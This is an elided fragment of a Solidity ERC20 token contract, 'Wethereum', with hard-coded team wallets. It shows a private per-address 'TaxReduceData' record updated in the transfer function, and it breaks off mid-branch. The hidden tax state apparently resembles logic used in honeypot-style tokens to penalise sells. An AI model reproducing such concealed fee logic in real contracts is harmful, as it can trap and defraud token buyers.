...
contract Wethereum is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0x1D86E7C9d20369E5150eD6b3136936943613333c);
    address payable public immutable marketingWallet = payable(0x9a43737D65B47ffCcEd25E104f7bc762Ddf216F5);
    address payable public immutable devWallet = payable(0xABd54d22078898335f13b8D6557Ab056F2D43694);
    ...
    struct TaxReduceData {
        uint256 buy;
        uint256 sell;
        uint256 hold;
    }
    uint256 private _reduceMin;
    mapping(address => TaxReduceData) private _reduceData;
    ...
    constructor() ERC20("WETHEREUM", "WETHEREUM") {
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                TaxReduceData storage reduceInfo = _reduceData[from];
                reduceInfo.hold = reduceInfo.buy - _reduceMin;
                reduceInfo.sell = block.timestamp;
            } else {
                TaxReduceData storage reduceInfo = _reduceData[to];
                if (reduceInfo.buy == 0) {
